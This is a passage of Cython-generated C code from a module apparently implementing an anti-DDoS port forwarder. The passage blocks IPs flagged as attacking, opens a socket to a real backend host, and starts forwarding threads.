                                        __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
                                    if (__pyx_t_16) {
                                        __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_kp_u_Detected_DDOS_from_Blocking, __pyx_n_s_format); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 140, __pyx_L44_error)
                                            __Pyx_GOTREF(__pyx_t_4);
                                        __pyx_t_3 = NULL;
                                        if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_4))) {
                                            __pyx_t_3 = PyMethod_GET_SELF(__pyx_t_4);
                                            if (likely(__pyx_t_3)) {
                                                PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_4);
                                                __Pyx_INCREF(__pyx_t_3);
                                                __Pyx_INCREF(function);
                                                __Pyx_DECREF_SET(__pyx_t_4, function);
                                            }
                                        }
                                        __pyx_t_2 = (__pyx_t_3) ? __Pyx_PyObject_Call2Args(__pyx_t_4, __pyx_t_3, __pyx_v_con_ip) : __Pyx_PyObject_CallOneArg(__pyx_t_4, __pyx_v_con_ip);
                                        __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
                                        if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 140, __pyx_L44_error)
                                            __Pyx_GOTREF(__pyx_t_2);
                                        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
                                        __pyx_t_4 = __Pyx_PyObject_CallOneArg(__pyx_builtin_print, __pyx_t_2); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 140, __pyx_L44_error)
                                            __Pyx_GOTREF(__pyx_t_4);
                                        __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
                                        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
                                        __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_block); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 141, __pyx_L44_error)
                                            __Pyx_GOTREF(__pyx_t_4);
                                        __pyx_t_22 = __Pyx_PyObject_Append(__pyx_t_4, __pyx_v_con_ip); if (unlikely(__pyx_t_22 == ((int)-1))) __PYX_ERR(0, 141, __pyx_L44_error)
                                            __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
                                        __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_Thread); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 142, __pyx_L44_error)
                                            __Pyx_GOTREF(__pyx_t_2);
                                        __pyx_t_3 = __Pyx_PyDict_NewPresized(2); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 142, __pyx_L44_error)
                                            __Pyx_GOTREF(__pyx_t_3);
                                        __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_block_ip); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 142, __pyx_L44_error)
                                            __Pyx_GOTREF(__pyx_t_1);
                                        if (PyDict_SetItem(__pyx_t_3, __pyx_n_s_target, __pyx_t_1) < 0) __PYX_ERR(0, 142, __pyx_L44_error)
                                            __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
                                        __pyx_t_1 = PyTuple_New(3); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 142, __pyx_L44_error)
                                            __Pyx_GOTREF(__pyx_t_1);
                                        __Pyx_INCREF(__pyx_v_con_ip);
                                        __Pyx_GIVEREF(__pyx_v_con_ip);
                                        PyTuple_SET_ITEM(__pyx_t_1, 0, __pyx_v_con_ip);
                                        __Pyx_INCREF(__pyx_v_port);
                                        __Pyx_GIVEREF(__pyx_v_port);
                                        PyTuple_SET_ITEM(__pyx_t_1, 1, __pyx_v_port);
                                        __Pyx_INCREF(__pyx_v_a);
                                        __Pyx_GIVEREF(__pyx_v_a);
                                        PyTuple_SET_ITEM(__pyx_t_1, 2, __pyx_v_a);
                                        if (PyDict_SetItem(__pyx_t_3, __pyx_n_s_args, __pyx_t_1) < 0) __PYX_ERR(0, 142, __pyx_L44_error)
                                            __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
                                        __pyx_t_1 = __Pyx_PyObject_Call(__pyx_t_2, __pyx_empty_tuple, __pyx_t_3); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 142, __pyx_L44_error)
                                            __Pyx_GOTREF(__pyx_t_1);
                                        __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
                                        __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
                                        __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_t_1, __pyx_n_s_start); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 142, __pyx_L44_error)
                                            __Pyx_GOTREF(__pyx_t_3);
                                        __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
                                        __pyx_t_1 = NULL;
                                        if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_3))) {
                                            __pyx_t_1 = PyMethod_GET_SELF(__pyx_t_3);
                                            if (likely(__pyx_t_1)) {
                                                PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_3);
                                                __Pyx_INCREF(__pyx_t_1);
                                                __Pyx_INCREF(function);
                                                __Pyx_DECREF_SET(__pyx_t_3, function);
                                            }
                                        }
                                        __pyx_t_4 = (__pyx_t_1) ? __Pyx_PyObject_CallOneArg(__pyx_t_3, __pyx_t_1) : __Pyx_PyObject_CallNoArg(__pyx_t_3);
                                        __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
                                        if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 142, __pyx_L44_error)
                                            __Pyx_GOTREF(__pyx_t_4);
                                        __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
                                        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
                                        goto __pyx_L50_try_continue;
                                    }
                                }
                                __Pyx_XDECREF(__pyx_t_17); __pyx_t_17 = 0;
                                __Pyx_XDECREF(__pyx_t_18); __pyx_t_18 = 0;
                                __Pyx_XDECREF(__pyx_t_19); __pyx_t_19 = 0;
                                goto __pyx_L51_try_end;
                            __pyx_L44_error:;
                                __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
                                __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
                                __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
                                __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
                                __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
                                __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0; {
                                    __Pyx_AddTraceback("anti.open_port", __pyx_clineno, __pyx_lineno, __pyx_filename);
                                    if (__Pyx_GetException(&__pyx_t_4, &__pyx_t_3, &__pyx_t_1) < 0) __PYX_ERR(0, 144, __pyx_L46_except_error)
                                        __Pyx_GOTREF(__pyx_t_4);
                                    __Pyx_GOTREF(__pyx_t_3);
                                    __Pyx_GOTREF(__pyx_t_1);
                                    __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_ddos); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 145, __pyx_L46_except_error)
                                        __Pyx_GOTREF(__pyx_t_2);
                                    if (unlikely(PyObject_SetItem(__pyx_t_2, __pyx_v_con_ip, __pyx_int_1) < 0)) __PYX_ERR(0, 145, __pyx_L46_except_error)
                                        __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
                                    __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
                                    __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
                                    __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
                                    goto __pyx_L45_exception_handled;
                                }
                            __pyx_L46_except_error:;
                                __Pyx_XGIVEREF(__pyx_t_17);
                                __Pyx_XGIVEREF(__pyx_t_18);
                                __Pyx_XGIVEREF(__pyx_t_19);
                                __Pyx_ExceptionReset(__pyx_t_17, __pyx_t_18, __pyx_t_19);
                                goto __pyx_L11_error;
                            __pyx_L50_try_continue:;
                                __Pyx_XGIVEREF(__pyx_t_17);
                                __Pyx_XGIVEREF(__pyx_t_18);
                                __Pyx_XGIVEREF(__pyx_t_19);
                                __Pyx_ExceptionReset(__pyx_t_17, __pyx_t_18, __pyx_t_19);
                                goto __pyx_L17_try_continue;
                            __pyx_L45_exception_handled:;
                                __Pyx_XGIVEREF(__pyx_t_17);
                                __Pyx_XGIVEREF(__pyx_t_18);
                                __Pyx_XGIVEREF(__pyx_t_19);
                                __Pyx_ExceptionReset(__pyx_t_17, __pyx_t_18, __pyx_t_19);
                            __pyx_L51_try_end:;
                            }
                            __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_socket); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 146, __pyx_L11_error)
                                __Pyx_GOTREF(__pyx_t_3);
                            __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_socket); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 146, __pyx_L11_error)
                                __Pyx_GOTREF(__pyx_t_4);
                            __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
                            __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_socket); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 146, __pyx_L11_error)
                                __Pyx_GOTREF(__pyx_t_3);
                            __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_AF_INET); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 146, __pyx_L11_error)
                                __Pyx_GOTREF(__pyx_t_2);
                            __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
                            __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_socket); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 146, __pyx_L11_error)
                                __Pyx_GOTREF(__pyx_t_3);
                            __pyx_t_7 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_SOCK_STREAM); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 146, __pyx_L11_error)
                                __Pyx_GOTREF(__pyx_t_7);
                            __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
                            __pyx_t_3 = NULL;
                            __pyx_t_6 = 0;
                            if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_4))) {
                                __pyx_t_3 = PyMethod_GET_SELF(__pyx_t_4);
                                if (likely(__pyx_t_3)) {
                                    PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_4);
                                    __Pyx_INCREF(__pyx_t_3);
                                    __Pyx_INCREF(function);
                                    __Pyx_DECREF_SET(__pyx_t_4, function);
                                    __pyx_t_6 = 1;
                                }
                            }
#if CYTHON_FAST_PYCALL
                            if (PyFunction_Check(__pyx_t_4)) {
                                PyObject* __pyx_temp[3] = { __pyx_t_3, __pyx_t_2, __pyx_t_7 };
                                __pyx_t_1 = __Pyx_PyFunction_FastCall(__pyx_t_4, __pyx_temp + 1 - __pyx_t_6, 2 + __pyx_t_6); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 146, __pyx_L11_error)
                                    __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
                                __Pyx_GOTREF(__pyx_t_1);
                                __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
                                __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
                            }
                            else
#endif
#if CYTHON_FAST_PYCCALL
                                if (__Pyx_PyFastCFunction_Check(__pyx_t_4)) {
                                    PyObject* __pyx_temp[3] = { __pyx_t_3, __pyx_t_2, __pyx_t_7 };
                                    __pyx_t_1 = __Pyx_PyCFunction_FastCall(__pyx_t_4, __pyx_temp + 1 - __pyx_t_6, 2 + __pyx_t_6); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 146, __pyx_L11_error)
                                        __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
                                    __Pyx_GOTREF(__pyx_t_1);
                                    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
                                    __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
                                }
                                else
#endif
                                {
                                    __pyx_t_5 = PyTuple_New(2 + __pyx_t_6); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 146, __pyx_L11_error)
                                        __Pyx_GOTREF(__pyx_t_5);
                                    if (__pyx_t_3) {
                                        __Pyx_GIVEREF(__pyx_t_3); PyTuple_SET_ITEM(__pyx_t_5, 0, __pyx_t_3); __pyx_t_3 = NULL;
                                    }
                                    __Pyx_GIVEREF(__pyx_t_2);
                                    PyTuple_SET_ITEM(__pyx_t_5, 0 + __pyx_t_6, __pyx_t_2);
                                    __Pyx_GIVEREF(__pyx_t_7);
                                    PyTuple_SET_ITEM(__pyx_t_5, 1 + __pyx_t_6, __pyx_t_7);
                                    __pyx_t_2 = 0;
                                    __pyx_t_7 = 0;
                                    __pyx_t_1 = __Pyx_PyObject_Call(__pyx_t_4, __pyx_t_5, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 146, __pyx_L11_error)
                                        __Pyx_GOTREF(__pyx_t_1);
                                    __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
                                }
                            __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
                            __Pyx_XDECREF_SET(__pyx_v_server_socket, __pyx_t_1);
                            __pyx_t_1 = 0;
                            __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_v_server_socket, __pyx_n_s_connect); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 147, __pyx_L11_error)
                                __Pyx_GOTREF(__pyx_t_4);
                            __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_host_real); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 147, __pyx_L11_error)
                                __Pyx_GOTREF(__pyx_t_5);
                            __pyx_t_7 = __Pyx_PyObject_CallOneArg(((PyObject*)(&PyUnicode_Type)), __pyx_t_5); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 147, __pyx_L11_error)
                                __Pyx_GOTREF(__pyx_t_7);
                            __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
                            __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_port_real); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 147, __pyx_L11_error)
                                __Pyx_GOTREF(__pyx_t_5);
                            __pyx_t_2 = __Pyx_PyNumber_Int(__pyx_t_5); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 147, __pyx_L11_error)
                                __Pyx_GOTREF(__pyx_t_2);
                            __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
                            __pyx_t_5 = PyTuple_New(2); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 147, __pyx_L11_error)
                                __Pyx_GOTREF(__pyx_t_5);
                            __Pyx_GIVEREF(__pyx_t_7);
                            PyTuple_SET_ITEM(__pyx_t_5, 0, __pyx_t_7);
                            __Pyx_GIVEREF(__pyx_t_2);
                            PyTuple_SET_ITEM(__pyx_t_5, 1, __pyx_t_2);
                            __pyx_t_7 = 0;
                            __pyx_t_2 = 0;
                            __pyx_t_2 = NULL;
                            if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_4))) {
                                __pyx_t_2 = PyMethod_GET_SELF(__pyx_t_4);
                                if (likely(__pyx_t_2)) {
                                    PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_4);
                                    __Pyx_INCREF(__pyx_t_2);
                                    __Pyx_INCREF(function);
                                    __Pyx_DECREF_SET(__pyx_t_4, function);
                                }
                            }
                            __pyx_t_1 = (__pyx_t_2) ? __Pyx_PyObject_Call2Args(__pyx_t_4, __pyx_t_2, __pyx_t_5) : __Pyx_PyObject_CallOneArg(__pyx_t_4, __pyx_t_5);
                            __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
                            __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
                            if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 147, __pyx_L11_error)
                                __Pyx_GOTREF(__pyx_t_1);
                            __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
                            __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
                            __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_Thread); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 148, __pyx_L11_error)
                                __Pyx_GOTREF(__pyx_t_4);
                            __pyx_t_5 = __Pyx_PyDict_NewPresized(2); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 148, __pyx_L11_error)
                                __Pyx_GOTREF(__pyx_t_5);
                            __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_forward); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 148, __pyx_L11_error)
                                __Pyx_GOTREF(__pyx_t_2);
                            if (PyDict_SetItem(__pyx_t_5, __pyx_n_s_target, __pyx_t_2) < 0) __PYX_ERR(0, 148, __pyx_L11_error)
                                __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
                            __pyx_t_2 = PyTuple_New(4); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 148, __pyx_L11_error)
                                __Pyx_GOTREF(__pyx_t_2);
                            __Pyx_INCREF(__pyx_v_con_ip);
                            __Pyx_GIVEREF(__pyx_v_con_ip);
                            PyTuple_SET_ITEM(__pyx_t_2, 0, __pyx_v_con_ip);
                            __Pyx_INCREF(__pyx_v_port);
                            __Pyx_GIVEREF(__pyx_v_port);
                            PyTuple_SET_ITEM(__pyx_t_2, 1, __pyx_v_port);
                            __Pyx_INCREF(__pyx_v_a);
                            __Pyx_GIVEREF(__pyx_v_a);
                            PyTuple_SET_ITEM(__pyx_t_2, 2, __pyx_v_a);
                            __Pyx_INCREF(__pyx_v_server_socket);
                            __Pyx_GIVEREF(__pyx_v_server_socket);
                            PyTuple_SET_ITEM(__pyx_t_2, 3, __pyx_v_server_socket);
                            if (PyDict_SetItem(__pyx_t_5, __pyx_n_s_args, __pyx_t_2) < 0) __PYX_ERR(0, 148, __pyx_L11_error)
                                __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
                            __pyx_t_2 = __Pyx_PyObject_Call(__pyx_t_4, __pyx_empty_tuple, __pyx_t_5); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 148, __pyx_L11_error)
                                __Pyx_GOTREF(__pyx_t_2);
                            __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
                            __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
                            __pyx_t_5 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_start); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 148, __pyx_L11_error)
                                __Pyx_GOTREF(__pyx_t_5);
                            __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
                            __pyx_t_2 = NULL;
                            if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_5))) {
                                __pyx_t_2 = PyMethod_GET_SELF(__pyx_t_5);
                                if (likely(__pyx_t_2)) {
                                    PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_5);
                                    __Pyx_INCREF(__pyx_t_2);
                                    __Pyx_INCREF(function);
                                    __Pyx_DECREF_SET(__pyx_t_5, function);
                                }
                            }
                            __pyx_t_1 = (__pyx_t_2) ? __Pyx_PyObject_CallOneArg(__pyx_t_5, __pyx_t_2) : __Pyx_PyObject_CallNoArg(__pyx_t_5);
                            __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
                            if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 148, __pyx_L11_error)
                                __Pyx_GOTREF(__pyx_t_1);
                            __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
                            __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
                            __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_Thread); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 149, __pyx_L11_error)
                                __Pyx_GOTREF(__pyx_t_5);
                            __pyx_t_2 = __Pyx_PyDict_NewPresized(2); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 149, __pyx_L11_error)
                                __Pyx_GOTREF(__pyx_t_2);
                            __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_forward); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 149, __pyx_L11_error)
                                __Pyx_GOTREF(__pyx_t_4);
                            if (PyDict_SetItem(__pyx_t_2, __pyx_n_s_target, __pyx_t_4) < 0) __PYX_ERR(0, 149, __pyx_L11_error)
                                __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
                            __pyx_t_4 = PyTuple_New(4); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 149, __pyx_L11_error)
                                __Pyx_GOTREF(__pyx_t_4);
                            __Pyx_INCREF(__pyx_v_con_ip);
                            __Pyx_GIVEREF(__pyx_v_con_ip);
                            PyTuple_SET_ITEM(__pyx_t_4, 0, __pyx_v_con_ip);
                            __Pyx_INCREF(__pyx_v_port);
                            __Pyx_GIVEREF(__pyx_v_port);
                            PyTuple_SET_ITEM(__pyx_t_4, 1, __pyx_v_port);
                            __Pyx_INCREF(__pyx_v_server_socket);
                            __Pyx_GIVEREF(__pyx_v_server_socket);
                            PyTuple_SET_ITEM(__pyx_t_4, 2, __pyx_v_server_socket);
                            __Pyx_INCREF(__pyx_v_a);
                            __Pyx_GIVEREF(__pyx_v_a);
                            PyTuple_SET_ITEM(__pyx_t_4, 3, __pyx_v_a);
                            if (PyDict_SetItem(__pyx_t_2, __pyx_n_s_args, __pyx_t_4) < 0) __PYX_ERR(0, 149, __pyx_L11_error)
                                __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
                            __pyx_t_4 = __Pyx_PyObject_Call(__pyx_t_5, __pyx_empty_tuple, __pyx_t_2); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 149, __pyx_L11_error)
                                __Pyx_GOTREF(__pyx_t_4);
                            __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
                            __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
                            __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_4, __pyx_n_s_start); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 149, __pyx_L11_error)
                                __Pyx_GOTREF(__pyx_t_2);
                            __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
                            __pyx_t_4 = NULL;
                            if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_2))) {
                                __pyx_t_4 = PyMethod_GET_SELF(__pyx_t_2);
                                if (likely(__pyx_t_4)) {
                                    PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_2);
                                    __Pyx_INCREF(__pyx_t_4);
                                    __Pyx_INCREF(function);
                                    __Pyx_DECREF_SET(__pyx_t_2, function);
                                }
                            }
                            __pyx_t_1 = (__pyx_t_4) ? __Pyx_PyObject_CallOneArg(__pyx_t_2, __pyx_t_4) : __Pyx_PyObject_CallNoArg(__pyx_t_2);
                            __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
                            if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 149, __pyx_L11_error)
                                __Pyx_GOTREF(__pyx_t_1);
                            __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
                            __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
                        }
                    __pyx_L21:;
                        __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_sleep); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 150, __pyx_L11_error)
                            __Pyx_GOTREF(__pyx_t_2);
                        __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_time_connect); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 150, __pyx_L11_error)
                            __Pyx_GOTREF(__pyx_t_4);
                        __pyx_t_5 = __Pyx_PyNumber_Float(__pyx_t_4); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 150, __pyx_L11_error)
                            __Pyx_GOTREF(__pyx_t_5);
                        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
                        __pyx_t_4 = NULL;
                        if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_2))) {
                            __pyx_t_4 = PyMethod_GET_SELF(__pyx_t_2);
                            if (likely(__pyx_t_4)) {
                                PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_2);
                                __Pyx_INCREF(__pyx_t_4);
                                __Pyx_INCREF(function);
                                __Pyx_DECREF_SET(__pyx_t_2, function);
                            }
                        }
                        __pyx_t_1 = (__pyx_t_4) ? __Pyx_PyObject_Call2Args(__pyx_t_2, __pyx_t_4, __pyx_t_5) : __Pyx_PyObject_CallOneArg(__pyx_t_2, __pyx_t_5);
                        __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
                        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
                        if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 150, __pyx_L11_error)
                            __Pyx_GOTREF(__pyx_t_1);
                        __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
                        __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
                    }
                    __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;
                    __Pyx_XDECREF(__pyx_t_12); __pyx_t_12 = 0;
                    __Pyx_XDECREF(__pyx_t_13); __pyx_t_13 = 0;
                    goto __pyx_L18_try_end;
                __pyx_L11_error:;
                    __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
                    __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
                    __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
                    __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
                    __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
                    __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
                    __pyx_t_6 = __Pyx_PyErr_ExceptionMatches(__pyx_builtin_OSError);
                    if (__pyx_t_6) {
                        __Pyx_AddTraceback("anti.open_port", __pyx_clineno, __pyx_lineno, __pyx_filename);
                        if (__Pyx_GetException(&__pyx_t_1, &__pyx_t_2, &__pyx_t_5) < 0) __PYX_ERR(0, 151, __pyx_L13_except_error)
                            __Pyx_GOTREF(__pyx_t_1);
                        __Pyx_GOTREF(__pyx_t_2);
                        __Pyx_GOTREF(__pyx_t_5);
                        __Pyx_INCREF(__pyx_t_2);
                        __pyx_v_e = __pyx_t_2; {
                            __pyx_t_4 = PyTuple_New(4); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 152, __pyx_L60_error)
                                __Pyx_GOTREF(__pyx_t_4);
                            __pyx_t_20 = 0;
                            __pyx_t_21 = 127;
                            __Pyx_INCREF(__pyx_kp_u_ERROR_Port);
                            __pyx_t_20 += 12;
                            __Pyx_GIVEREF(__pyx_kp_u_ERROR_Port);
                            PyTuple_SET_ITEM(__pyx_t_4, 0, __pyx_kp_u_ERROR_Port);
                            __pyx_t_7 = __Pyx_PyObject_FormatSimple(__pyx_v_port, __pyx_empty_unicode); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 152, __pyx_L60_error)
                                __Pyx_GOTREF(__pyx_t_7);
                            __pyx_t_21 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_7) > __pyx_t_21) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_7) : __pyx_t_21;
                            __pyx_t_20 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_7);
                            __Pyx_GIVEREF(__pyx_t_7);
                            PyTuple_SET_ITEM(__pyx_t_4, 1, __pyx_t_7);
                            __pyx_t_7 = 0;
                            __Pyx_INCREF(__pyx_kp_u__22);
                            __pyx_t_20 += 3;
                            __Pyx_GIVEREF(__pyx_kp_u__22);
                            PyTuple_SET_ITEM(__pyx_t_4, 2, __pyx_kp_u__22);
                            __pyx_t_7 = __Pyx_PyObject_FormatSimple(__pyx_v_e, __pyx_empty_unicode); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 152, __pyx_L60_error)
                                __Pyx_GOTREF(__pyx_t_7);
                            __pyx_t_21 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_7) > __pyx_t_21) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_7) : __pyx_t_21;
                            __pyx_t_20 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_7);
                            __Pyx_GIVEREF(__pyx_t_7);
                            PyTuple_SET_ITEM(__pyx_t_4, 3, __pyx_t_7);
                            __pyx_t_7 = 0;
                            __pyx_t_7 = __Pyx_PyUnicode_Join(__pyx_t_4, 4, __pyx_t_20, __pyx_t_21); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 152, __pyx_L60_error)
                                __Pyx_GOTREF(__pyx_t_7);
                            __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
                            __pyx_t_4 = __Pyx_PyObject_CallOneArg(__pyx_builtin_print, __pyx_t_7); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 152, __pyx_L60_error)
                                __Pyx_GOTREF(__pyx_t_4);
                            __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
                            __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
                            goto __pyx_L57_continue;
                        } {
                        __pyx_L60_error:; {
                            __Pyx_PyThreadState_declare
                                __Pyx_PyThreadState_assign
                                __pyx_t_19 = 0; __pyx_t_18 = 0; __pyx_t_17 = 0; __pyx_t_25 = 0; __pyx_t_26 = 0; __pyx_t_27 = 0;
